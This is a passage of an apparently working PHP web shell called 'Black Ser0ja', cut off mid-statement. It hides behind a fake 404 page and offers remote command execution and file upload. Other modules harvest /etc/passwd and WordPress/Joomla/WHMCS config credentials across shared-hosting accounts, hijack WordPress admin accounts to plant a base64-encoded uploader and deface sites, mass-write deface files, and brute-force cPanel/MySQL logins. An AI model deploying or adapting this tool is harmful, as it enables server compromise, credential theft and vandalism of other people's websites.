<?php
session_start();
@error_reporting(0);
@set_time_limit(0);

if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}

@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

///gg
$password = "102a6ed6587b5b8cb4ebbe972864690b"; 

function login_shell() {
$random_url = mt_rand(1000000, 247345736453);
$curl = curl_init();
$protocol = 'http://';
if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') { $protocol = 'https://'; }
curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$server_404 = curl_exec($curl);
$server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
$server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
echo $server_404;
exit;
}

function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}

$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;


function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if(empty($password) || (isset($_GET['passwd']) && (md5($_GET['passwd']) == $password))) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        echo "<script>document.location.href = '?'</script>";
    } else {
        login_shell();
	}
}
///ggend

?>
<title>Black Ser0ja</title>
<link href="http://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" type="text/css">

<style>
#title{
	font-size:30px;
	font-weight:bold;
	font-family:Ubuntu;
	display:block;
	padding:15px 0px 0px 0px;
}
	
body {
    background: black;
    color: #00FF00;
    font-family: monospace;
}

#content .first{
background-color: black;
}

table{
border: 0px #000000 dotted;
}

a{
color: white;
text-decoration: none;
}

input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}

	#menu{
	background:#000000;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:2px 2px;
	margin:1;
	background:#202121;
	text-decoration:none;
	letter-spacing:1px;
	-moz-border-radius: 10px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
    
}
#menu a:hover{
	background:green;
	border-bottom:1px solid #red;
	border-top:1px solid #red;
	
}

.kembang {
   text-align: center;
 }

.kembang pre {
  display: inline-block;
  text-align: left;
 }

</style>
<body bgcolor="white" text="black">
<center>
<span id="title">Black Ser0ja</span><br>
<?php
echo"<font color=gold>".php_uname()."";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "<br>DisablePHP=".$disable_functions; print "\n"; 
		
		echo"<p>
<font size='3' color='gold'><center>
[SPACE: <font color=green>$total</font>] [Free: <font color=lime>$freespace</font>]</center>";
echo"<center></font>";
		?>
<div class="kembang">
<pre style="text-align: left;">
                 __
             .-.'  '.-.
          .-(   \  /   )-.
         /   '..oOOo..'   \
 ,       \.--.oOOOOOOo.--./
 |\  ,   (   :oOOOOOOo:   )
_\.\/|   /'--'oOOOOOOo'--'\
'-.. ;/| \   .''oOOo''.   /
.--`'. :/|'-(   /  \   )-'
 '--. `. / //'-'.__.'-;
   `'-,_';//      ,  /|
        '((       |\/./_
          \\  . |\; ..-'
           \\ |\: .'`--.
            \\, .' .--'
             ))'_,-'`
       sin  //-'
           // 
          //
         //
</pre>
</div>

	
<br><center><div id="menu">
<a href="?home">Uploader</a>
<a href="?cmd">Console</a>
<a href="?info">whoami</a>
<a href="?massconfig">WP ConfDeface</a>
<a href="?configs">ConfGrab</a>
<a href="?grab">sym</a>
<a href="?grab">jumping</a>
<a href="?massbut">Nggoblokin orang</a>
<a href="?brute">cPanel BF</a>
<a href="?indx">Jommla/WP MassDef</a>
<p>
<a href="?liatdomain">DF</a>
<a href="?ch">ShellChecker</a>
<a href="?def">DefaceChecker</a>
<a href="?enc0">ScEncoderDecoder</a>
<a href="?arrayx">Arrayuploader/CSRF</a>
<a href="?filx">MailFilter</a>
<a href="?mailer">Mailer</a>
<a href="?dumpx">Dumper</a>
<p>
<a href="?z0">Mirror MassPoster</a>
<a href="?smtp">SMTP Stealer</a>
<a href="?bc">BackConnect</a>
<a href="?l0c">LocalrootGrabber</a>
<a href="?hsp">Hsphere Excecute</a>
<p>
<a href="?mag0">Magento</a>
<a href="?cpres">cPanel Resetpasswd</a>
<a href="?cpfsuck">cPanel/FTP massDef</a>
<a href="?mysqsuck">MYSQL interface</a>
<p>
<a href="?krpd">RDPtools</a>
<a href="?mpc">MassPasswdChanger</a>
<a href="?suckmywp">WP TitleSucks</a>
<a href="?whmkill0">WHMCSkiller</a>
<p>
<a href="?w0t">Mass WipeOut</a>
<a href="?rce">LocalRCE</a>
<a href="?byp">Bypasser</a>
<p>
<a href="?call">SUMMON</a>
<a href="?ab0">ABOUT</a>
</div></center>

<?php

error_reporting(0);
function sikel(){
echo"<br><br><font size=3>True attacker always moving in the shadow.<br>
<hr width=30%><br>&copy; Sinkaroid | Every flowers must have a great root.<br>Stupidc0de</font>";
}
if(isset($_GET['home'])){
	
			echo"<font color=gold>".php_uname()."";
		print "\n";$disable_functions = @ini_get("disable_functions"); 
		echo "<br>DisablePHP=".$disable_functions; print "\n"; 
		echo"<br><br><br><form method=post enctype=multipart/form-data>"; 
		echo"<input type=file name=f><input name=k type=submit id=k value=pencet><br>"; 
		  if($_POST["k"]==pencet)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"succes-> <b>".$_FILES["f"]["name"];
echo"</b>";
}else{
echo"<b>Gagal upload kampret</b>";
}
}

}
elseif(isset($_GET['cmd'])){
	?><form  method="POST" action="">
	
	<font color=gold><b>COMMAND :</b></font>
	<input type="text"  style="background:white;color:black;" size="50"  name="cmd">
	<input type="submit" value=" > ">
</form>
<?php if(isset($_POST['cmd'])){
$data = $_POST['cmd'];
$result = shell_exec($data);
}else{
$result = shell_exec("help");
}
?>
<textarea readonly="" style="background:white;color:black;margin: 0px; width: 500px; height: 293px;">
<?php echo $result;?>
</textarea>
<br><br>
<?php

}elseif(isset($_GET['info'])){
  $s_safemode = ini_get("safe_mode");
  if($s_safemode = TRUE){$s_safemode = "<span class='enabled'>[ON";}else{$s_safemode = "<span class='disabled'>[OFF"; }
  if(extension_loaded('curl')){$curls="<span class='enabled'>[ON]</span>";}else{$curls="<span class='disabled'>[OFF]</span>";}
	echo "
	<br>
	<font size='6' color='red'>
#whoami
</font><p>
	<b>Server Name: </b>".$_SERVER["SERVER_NAME"]."<br />
	<br><b>Server IP: </b>".$_SERVER["SERVER_ADDR"]." <span class='enabled'><a href='http://www.who.is/whois/".$_SERVER['HTTP_HOST']."' target='_blank'>[WHOIS]</a> - <a href='http://www.dnsstuff.com/tools?runFromMain=".$_SERVER["SERVER_ADDR"]."&toolType=traceroute' target='_blank'>[TRACEROUTE]</a></span><br />".
	"<br><b>Shell Location: </b>".$_SERVER["SCRIPT_FILENAME"]."<br />
	<br><b>Server Software: </b>".$_SERVER["SERVER_SOFTWARE"]." <span class='enabled'><a href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=".$_SERVER['SERVER_SOFTWARE']."&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=' target='_blank'>[Exploit DB]</a></span><br />
	<p></p>";
	$id = @get_current_user();
	echo "ID : $id";
	echo " | <b>Server Port: </b>".$_SERVER['SERVER_PORT']." | <b>HTTP Connection: </b>".$_SERVER['HTTP_CONNECTION']." | <b>Operating System:</b> ".php_uname()."<br /><br />";
	if(get_magic_quotes_gpc()){echo "<b>Magic Quotes:</b> <span class='enabled'>[ENABLED]</span><br /><br />";}else{echo "<b>Magic Quotes:</b> <span class='disabled'>[DISABLED]</span> | ";}
	echo "<b>PHP Version:</b> ".phpversion()." | <b>Safe Mode: </b>".$s_safemode."]</span> | <b>Curl: </b>".$curls."<br /><br /><b>Accept Encoding: </b> ".$_SERVER['HTTP_ACCEPT_ENCODING']."<br><b>Admin: </b>".$_SERVER['SERVER_ADMIN']."<br /><br /><strong>DF: </strong>";
	if(!empty($disabled)){
	foreach($disabled as $functionsdis){
		echo $functionsdis.", ";
	}
	}else{
		echo "none";
	}
	
	
}
elseif(isset($_GET['massconfig'])){
error_reporting(0);
echo "
<!-- merahjudul --> 
<br><font size='6' color='red'>
#WPconfDeface
</font><p>
		<form method='POST'>
		<body><center><b><br>
		<b>Config & Auto Deface Wordpress by Indoxploit<b/><br>
		</p><center>script deface:<br>
        <textarea name='gay' cols='50' rows='10'>hacked by stupidc0de</textarea><br>
		username login (untuk manual) <input type=\"text\" name=\"usernamemek\" value=\"admin\"><br>
		password login (untuk manual) <input type=\"text\" name=\"passwordmek\" value=\"asu\"><br>
		nama file <input type=\"text\" name=\"namafile\" value=\"sin.htm\"><br>
		submit to zone-h <input type=\"text\" name=\"nama\" value=\"sinkaroid\"><br>
        <br><input type='submit' name='gopro' value='Start'><br>
        </form>
";

$gay = $_POST['gay']; //script deface
$uhenem = $_POST['usernamemek']; //username 
$pahwol = $_POST['passwordmek']; //password 
$filefile = $_POST['namafile']; //auto deface akan membuat file ...
$nama = $_POST['nama']; //untuk post ke zone-h
if($_POST['gopro']){
function save($data){
		$fp = @fopen("IndoXploit.htm", "a") or die("cant open file");
		fwrite($fp, $data);
		fclose($fp);
}

function anucurl($sites){
		$ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
	}

function lohgin($cek, $web, $userr, $pass){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "Log In",
					"redirect_to" => "$web/wp-admin/",
					"testcookie" => "1",
					);
$ch = curl_init ("$cek");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
	}

function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}


	
echo "<center><font size='5px'> Created By: IndoXploit</font><br>"; 
echo "hasil bisa dilihat di <a href='IndoXploit.htm' style='text-decoration: none'>IndoXploit.htm</a></center><br><br><br>";
	
$a = file_get_contents('/etc/passwd');
    preg_match_all('/(.*?):x:/', $a, $data);
    foreach($data[1] as $user){
$baca = file_get_contents("/home/$user/public_html/wp-config.php");
 
 /* symlink('/home/'.$user.'/public_html/wp-config.php',$user.'- config.txt');  */

if($baca!=""){
	

/* $b = `cp /home/$user/public_html/index.php $user-index.txt`; */

$file1 = "$user-config.txt";
$fp2 = fopen($file1,"w");
fputs($fp2,$baca);

$file = @file_get_contents($file1);


echo $user."-> sukses<br>";
					$host = ambilkata($file,"DB_HOST', '","'");
					$username = ambilkata($file,"DB_USER', '","'");
					$password = ambilkata($file,"DB_PASSWORD', '","'");
					$db = ambilkata($file,"DB_NAME', '","'");
					$dbprefix = ambilkata($file,"table_prefix  = '","'");
					$user_baru = $uhenem;
					$password_baru = $pahwol;
					$prefix = $db.".".$dbprefix."users";
					$sue = $db.".".$dbprefix."options";
					$pass = md5("$password_baru");
					$nick = $gay;

echo "# Db Host: $host<br>";
echo "# Db user: $username<br>";
echo "# Db Password: $password<br>";
echo "# Db name: $db<br>";
echo "# Table_Prefix: $dbprefix<br>";

mysql_connect($host,$username,$password);

        mysql_select_db($db);

		$tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
   		$r=mysql_fetch_array($tampil);
        $id = $r[ID];

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
         echo "# $target<br>";
        

         mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");

$site= "$target/wp-login.php";
$site2= "$target/wp-admin/theme-install.php?upload";
$a = lohgin($site, $target, $user_baru, $password_baru);
$b = lohgin($site2, $target, $user_baru, $password_baru);
			

$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
echo "# token -> $anu2<br>";


$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iJGZpbGVmaWxlIjsNCiAgICAgICAgICAgICAgICBpZiAoZmlsZV9leGlzdHMoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKSkgdW5saW5rKCIuLi8uLi8uLi8uLi8iLiRuZXdmaWxlMyk7DQogICAgICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkZmlsZTNbJ3RtcF9uYW1lJ10sICIuLi8uLi8uLi8uLi8kbmV3ZmlsZTMiKTsNCg0KPz4=");

$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$upload3);

$c = file_get_contents($w);
    
  $post2 = array(
					"_wpnonce" => "$anu2",
					"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
					"themezip" => "@m.php",
					"install-theme-submit" => "Install Now",
					);
$ch = curl_init ("$target/wp-admin/update.php?action=upload-theme");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);

$namafile = "wew.php";
$fp2 = fopen($namafile,"w");
fputs($fp2,$nick);

$y = date("Y");
$m = date("m");


$ch6 = curl_init("$target/wp-content/uploads/$y/$m/m.php");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS,
array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
$postResult = curl_exec($ch6);
curl_close($ch6);

$as = "$target/$filefile";
$bs = file_get_contents($as);
 if(preg_match("#hacked#si",$bs)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "# $as<br>";
                        save($as."<br>");
                        echo "# zone-h: ";
						$ch3 = curl_init ("http://www.zone-h.com/notify/single");
						curl_setopt ($ch3, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt ($ch3, CURLOPT_POST, 1);
						curl_setopt ($ch3, CURLOPT_POSTFIELDS, "defacer=$nama&domain1=$as&hackmode=1&reason=1");
						
        if (preg_match ("/color=\"red\">OK<\/font><\/li>/i", curl_exec ($ch3))){
                echo  " Ok  <br><br>";
        }else{
                echo " No <br><br>";}
                    }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";
                        echo "# coba aja manual: <br>";
                        echo "# $target/wp-login.php<br>";
                        echo "# username: $user_baru<br>";
                        echo "# password: $password_baru<br><br><br>";

                       
                    }
    }
else{
	echo "$user <= No<br>";
}



}
}
	echo"</b></b></b>";
	
}elseif(isset($_GET['configs'])){
	echo'<form action="?configs" method="post">';
echo "
<!-- merahjudul --> 
<br><font size='6' color='red'>
#ConfGrab
</font><p>
<body bgcolor=black>
<form method='POST'>";
echo "<center>";
?>
		<br><center>
		<?php if (empty($_POST['config'])) { ?>
		<p><font face="Tahoma" color="#007700" size="2pt">/etc/passwd content</p><br>
		<form method="POST">
			<textarea name="passwd" rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br>
			<input name="config" size="100" value="Grab!" type="submit"><br></form></center><br>
		<?php 
		
		}
	if ($_POST['config']) {
		$function = $functions=@ini_get("disable_functions");
		if(eregi("symlink",$functions)){die ('<error>Symlink disabled :( </error>');}
		@mkdir('config_nih', 0755);
		@chdir('config_nih');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];
$passwd=explode("\n",$passwd);
echo "<br><br><center><font color=#b0b000 size=2pt>proccess...</center><br>";
foreach($passwd as $pwd){
$pawd=explode(":",$pwd);$user =$pawd[0];
@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');
@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');
@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');
@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');
@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');
@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');
@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');
@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');
@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');
@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');
@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');
@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');
@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');
@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');
@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');
@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');
@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');
@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');
@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');
@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');
@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');
@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');
@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.txt');
@symlink('/home/'.$user.'/public_html/home/configuration.php',$user.'-joomla-home.txt');
@symlink('/home/'.$user.'/public_html/vb/includes/config.php',$user.'-vb-config.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm15.txt');
@symlink('/home/'.$user.'/public_html/central/configuration.php',$user.'-whm-central.txt');
@symlink('/home/'.$user.'/public_html/whm/whmcs/configuration.php',$user.'-whm-whmcs.txt');
@symlink('/home/'.$user.'/public_html/whm/WHMCS/configuration.php',$user.'-whm-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/WHM/configuration.php',$user.'-whmc-WHM.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-whmcs.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-support.txt');
@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-joomla.txt');
@symlink('/home/'.$user.'/public_html/submitticket.php',$user.'-whmcs2.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-whm.txt');}
echo "<b class='cone'><font face='Tahoma' color='#00dd00' size='2pt'><b>Done -></b> 
<a target='_blank' href='config_nih/'>Open configs</a></font></b>";

}
}elseif(isset($_GET['grab'])){
$maaf = file_get_contents('/etc/passwd');
preg_match_all('/(.*?):x:/', $maaf, $memek);
    foreach($memek[1] as $momok);
echo '
<!-- merahjudul --> 
<br><font size="6" color="red">
#sym
</font><p>
<center>';
echo getcwd();
/** echo'<form method="POST"><center><b>
<br>config grabber manual (recommended) coded by k2ll3d recoded by Kerupuk<br>
langsung klik "GO" jangan ganti inputnya!
<br>kecuali kalau dir nya beda, masukan link config manual<br></b><br><br> **/
echo'<input type="text" name="kontol" value="/home/'.$momok.'/public_html/wp-config.php" size="60"><br><br>
<input type="submit" name="klik" value="G0">
</form><br>'; 
$kontol = $_POST['kontol'];
if($_POST['klik']){
@mkdir('config_ini', 0755);
@chdir('config_ini');
$a = file_get_contents('/etc/passwd');
    preg_match_all('/(.*?):x:/', $a, $data);
    foreach($data[1] as $user){
$baca = file_get_contents("$kontol");
if($baca!=""){
$file1 = "$user-config.txt";
$fp2 = fopen($file1,"w");
fputs($fp2,$baca);

$file = @file_get_contents($file1);
}
}
echo'<br>hasil <a href="config_ini/" target="_blank">config_ini/</a><br><br>';
}
	
}elseif(isset($_GET['massbut'])){
echo "
<!-- merahjudul --> 
<br><font size='6' color='red'>
#nggoblokin
</font><p>
		<form method='POST'>
		<body><center><b><br>
		<b>Massbut a.k.a Masss 73mbu7 coded by Kerupuk<br>( jangan gunakan index.php )<b/><br>
		bisa pakai ini sebagai mass deface<br>
		</p><center>script deface:<br>
        <textarea name='gay' cols='50' rows='10' placeholder='hacked by Kerupuk'></textarea><br>
		file? <input type=\"text\" name=\"nama\" placeholder=\"x.htm\"><br>
        <input type='submit' value='Jembut All!'><br><br><br>
        </form>
";
$nama = $_POST['nama'];
$gay = $_POST['gay'];
$directory = ".";
$directory1 = "../";
$directory2 = "../../";
$directory3 = "../../../";
$directory4 = "../../../../";
$directory5 = "../../../../../";
$directory6 = "../../../../../../";
$directory7 = "../../../../../../../";

$d = glob($directory . "*");
foreach($d as $x)
{
 if(is_dir($x))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory/$file","w+");
$ngocok=@fopen("$x/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d1 = glob($directory1 . "*");
foreach($d1 as $x1)
{
 if(is_dir($x1))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory1/$file","w+");
$ngocok=@fopen("$x1/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x1/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d2 = glob($directory2 . "*");
foreach($d2 as $x2)
{
 if(is_dir($x2))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory2/$file","w+");
$ngocok=@fopen("$x2/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x2/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d3 = glob($directory3 . "*");
foreach($d3 as $x3)
{
 if(is_dir($x3))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory3/$file","w+");
$ngocok=@fopen("$x3/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x3/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d4 = glob($directory4 . "*");
foreach($d4 as $x4)
{
 if(is_dir($x4))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory4/$file","w+");
$ngocok=@fopen("$x4/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x4/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d5 = glob($directory5 . "*");
foreach($d5 as $x5)
{
 if(is_dir($x5))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory5/$file","w+");
$ngocok=@fopen("$x5/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x5/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d6 = glob($directory6 . "*");
foreach($d6 as $x6)
{
 if(is_dir($x6))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory6/$file","w+");
$ngocok=@fopen("$x6/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x6/$file<br>";
	}
 }
}
//////////////////// KERUPUK ////////////////////////
$d7 = glob($directory7 . "*");
foreach($d7 as $x7)
{
 if(is_dir($x7))
 {
$file=$nama; 
$script=$gay;
$ngocok=@fopen("$directory7/$file","w+");
$ngocok=@fopen("$x7/$file","w+");
$tulis=@fwrite($ngocok,$script);
if ($tulis){
echo"$x7/$file<br>";
	}
 }
}
	echo"</b></b></b>";
	
}
elseif(isset($_GET['brute'])){
		echo"<font size='6' color='red'>
#cPanelBF
</font>";
echo'<form action="?brute" method="post">';
@set_time_limit(0);
@error_reporting(0);


if($_POST['page']=='find')
{
if(isset($_POST['usernames']) && isset($_POST['passwords']))
{
    if($_POST['type'] == 'passwd'){
        $e = explode("\n",$_POST['usernames']);
        foreach($e as $value){
        $k = explode(":",$value);
        $username .= $k['0']." ";
        }
    }elseif($_POST['type'] == 'simple'){
        $username = str_replace("\n",' ',$_POST['usernames']);
    }
    $a1 = explode(" ",$username);
    $a2 = explode("\n",$_POST['passwords']);
    $id2 = count($a2);
    $ok = 0;
    foreach($a1 as $user )
    {
        if($user !== '')
        {
        $user=trim($user);
         for($i=0;$i<=$id2;$i++)
         {
            $pass = trim($a2[$i]);
            if(@mysql_connect('localhost',$user,$pass))
            {
                echo "Zmbut!! ~ user is (<b><font color=black>$user</font></b>) Password is (<b><font color=black>$pass</font></b>)<br />";
                $ok++;
            }
         }
        }
    }
    echo "<hr><b>You Found <font color=red>$ok</font> Cpanel</b>";
    echo "<center><b><a href=".$_SERVER['PHP_SELF']."?brute>BACK</a>";
    exit;
}
}
if($_POST['pass']=='password'){
@error_reporting(0);
$i = getenv('REMOTE_ADDR');
$d = date('D, M jS, Y H:i',time());
$h = $_SERVER['HTTP_HOST'];
$dir=$_SERVER['PHP_SELF'];
mkdir('config',0755);
$cp =
